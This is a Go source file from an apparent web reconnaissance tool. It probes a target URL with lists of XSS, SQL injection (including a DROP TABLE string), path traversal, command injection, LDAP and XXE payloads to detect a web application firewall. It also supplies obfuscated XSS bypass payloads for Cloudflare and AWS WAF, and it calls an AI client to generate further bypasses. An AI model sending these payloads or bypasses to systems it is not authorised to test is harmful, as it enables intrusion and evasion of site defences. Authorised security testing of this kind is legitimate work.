package waf

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/ezrec/ezrec/internal/ai"
	"github.com/ezrec/ezrec/internal/log"
)

// Detector handles WAF detection and bypass generation
type Detector struct {
	client *http.Client
	ai     *ai.Client
	logger *log.Logger
}

// NewDetector creates a new WAF detector
func NewDetector(aiClient *ai.Client, logger *log.Logger) *Detector {
	return &Detector{
		client: &http.Client{
			Timeout: 30 * time.Second,
		},
		ai:     aiClient,
		logger: logger,
	}
}

// TestPayloads represents common payloads for WAF detection
var TestPayloads = []string{
	// Basic XSS payloads
	"<script>alert('xss')</script>",
	"<img src=x onerror=alert('xss')>",
	"javascript:alert('xss')",
	"<svg onload=alert('xss')>",

	// SQL Injection payloads
	"' OR 1=1--",
	"1' UNION SELECT 1,2,3--",
	"'; DROP TABLE users--",
	"1' AND (SELECT COUNT(*) FROM sysobjects)>0--",

	// Path Traversal payloads
	"../../../etc/passwd",
	"....//....//....//etc/passwd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",

	// Command Injection payloads
	"; ls -la",
	"| whoami",
	"$(id)",
	"`pwd`",

	// LDAP Injection
	"*)(uid=*))(|(uid=*",
	"*)(|(mail=*))",

	// XXE payloads
	"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
}

// DetectWAF performs comprehensive WAF detection on a target URL
func (d *Detector) DetectWAF(ctx context.Context, targetURL string) (*ai.WAFDetection, error) {
	d.logger.Progress("Starting WAF detection", "target", targetURL)

	var responses []ai.WAFResponse

	// Test with various payloads
	for i, payload := range TestPayloads {
		if i >= 10 { // Limit to first 10 payloads to avoid overwhelming
			break
		}

		response, err := d.testPayload(ctx, targetURL, payload)
		if err != nil {
			d.logger.Debug("Failed to test payload", "payload", payload, "error", err)
			continue
		}

		responses = append(responses, *response)

		// Small delay to avoid overwhelming the target
		time.Sleep(100 * time.Millisecond)
	}

	if len(responses) == 0 {
		return &ai.WAFDetection{
			Present:     false,
			Type:        "Unknown",
			Confidence:  0.0,
			Description: "No responses received for analysis",
		}, nil
	}

	// Use AI to analyze responses if available
	if d.ai != nil && d.ai.IsEnabled() {
		d.logger.Progress("Analyzing responses with AI", "responses", len(responses))
		detection, err := d.ai.DetectWAF(ctx, targetURL, responses)
		if err != nil {
			d.logger.Warn("AI WAF detection failed, using fallback", "error", err)
			return d.fallbackDetection(responses), nil
		}
		return detection, nil
	}

	// Fallback to basic detection
	return d.fallbackDetection(responses), nil
}

// testPayload sends a payload to the target and analyzes the response
func (d *Detector) testPayload(ctx context.Context, targetURL, payload string) (*ai.WAFResponse, error) {
	// Try different injection points
	urls := []string{
		fmt.Sprintf("%s?test=%s", targetURL, payload),
		fmt.Sprintf("%s/%s", strings.TrimSuffix(targetURL, "/"), payload),
	}

	for _, url := range urls {
		req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
		if err != nil {
			continue
		}

		// Add common headers
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

		resp, err := d.client.Do(req)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		// Read response body (limited)
		body := make([]byte, 4096)
		n, _ := resp.Body.Read(body)
		bodyStr := string(body[:n])

		// Convert headers to map
		headers := make(map[string]string)
		for name, values := range resp.Header {
			if len(values) > 0 {
				headers[name] = values[0]
			}
		}

		// Determine if blocked
		blocked := d.isBlocked(resp.StatusCode, headers, bodyStr)

		return &ai.WAFResponse{
			URL:        url,
			Payload:    payload,
			StatusCode: resp.StatusCode,
			Headers:    headers,
			Body:       bodyStr,
			Blocked:    blocked,
		}, nil
	}

	return nil, fmt.Errorf("failed to test payload: %s", payload)
}

// isBlocked determines if a response indicates the payload was blocked
func (d *Detector) isBlocked(statusCode int, headers map[string]string, body string) bool {
	// Check status codes that typically indicate blocking
	if statusCode == 403 || statusCode == 406 || statusCode == 501 || statusCode == 999 {
		return true
	}

	// Check for WAF-specific headers
	for header, value := range headers {
		headerLower := strings.ToLower(header)
		valueLower := strings.ToLower(value)

		// CloudFlare indicators
		if strings.Contains(headerLower, "cf-") || strings.Contains(valueLower, "cloudflare") {
			if statusCode >= 400 {
				return true
			}
		}

		// Other WAF indicators
		if strings.Contains(valueLower, "blocked") ||
			strings.Contains(valueLower, "forbidden") ||
			strings.Contains(valueLower, "security") {
			return true
		}
	}

	// Check body for blocking indicators
	bodyLower := strings.ToLower(body)
	blockingKeywords := []string{
		"blocked", "forbidden", "access denied", "security violation",
		"malicious", "attack", "suspicious", "firewall", "waf",
		"cloudflare", "incapsula", "imperva", "f5", "akamai",
	}

	for _, keyword := range blockingKeywords {
		if strings.Contains(bodyLower, keyword) {
			return true
		}
	}

	return false
}

// fallbackDetection provides basic WAF detection without AI
func (d *Detector) fallbackDetection(responses []ai.WAFResponse) *ai.WAFDetection {
	blockedCount := 0
	var indicators []string
	wafType := "Unknown"

	for _, resp := range responses {
		if resp.Blocked {
			blockedCount++
		}

		// Check for specific WAF signatures
		for header, value := range resp.Headers {
			headerLower := strings.ToLower(header)
			valueLower := strings.ToLower(value)

			if strings.Contains(headerLower, "cf-") || strings.Contains(valueLower, "cloudflare") {
				wafType = "CloudFlare"
				indicators = append(indicators, fmt.Sprintf("Header: %s: %s", header, value))
			} else if strings.Contains(valueLower, "incapsula") {
				wafType = "Incapsula"
				indicators = append(indicators, fmt.Sprintf("Header: %s: %s", header, value))
			} else if strings.Contains(valueLower, "imperva") {
				wafType = "Imperva"
				indicators = append(indicators, fmt.Sprintf("Header: %s: %s", header, value))
			} else if strings.Contains(headerLower, "server") && strings.Contains(valueLower, "awselb") {
				wafType = "AWS WAF"
				indicators = append(indicators, fmt.Sprintf("Header: %s: %s", header, value))
			}
		}
	}

	present := blockedCount > 0
	confidence := float64(blockedCount) / float64(len(responses))

	return &ai.WAFDetection{
		Present:     present,
		Type:        wafType,
		Confidence:  confidence,
		Indicators:  indicators,
		Bypasses:    []string{"Use AI bypass generation for specific techniques"},
		Description: fmt.Sprintf("Basic detection found %d/%d requests blocked", blockedCount, len(responses)),
	}
}

// GenerateBypasses generates WAF bypass payloads using AI
func (d *Detector) GenerateBypasses(ctx context.Context, wafType, payloadType string) ([]string, error) {
	if d.ai == nil || !d.ai.IsEnabled() {
		return d.getStaticBypasses(wafType, payloadType), nil
	}

	d.logger.Progress("Generating AI-powered WAF bypasses", "waf", wafType, "type", payloadType)
	return d.ai.GenerateWAFBypasses(ctx, wafType, payloadType)
}

// getStaticBypasses provides static bypass payloads when AI is not available
func (d *Detector) getStaticBypasses(wafType, payloadType string) []string {
	bypasses := []string{
		// Generic bypasses
		"<ScRiPt>alert('xss')</ScRiPt>",
		"<img src=x onerror=alert('xss')>",
		"<svg/onload=alert('xss')>",
		"';alert('xss');//",
		"\">;alert('xss');//",
	}

	// Add WAF-specific bypasses
	switch strings.ToLower(wafType) {
	case "cloudflare":
		bypasses = append(bypasses,
			"<img src=x onerror=alert`1`>",
			"<svg onload=alert(String.fromCharCode(88,83,83))>",
			"<iframe src=javascript:alert('xss')>",
		)
	case "aws waf":
		bypasses = append(bypasses,
			"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))</script>",
			"<img src=x onerror=eval(atob('YWxlcnQoJ3hzcycp'))>",
		)
	}

	return bypasses
}
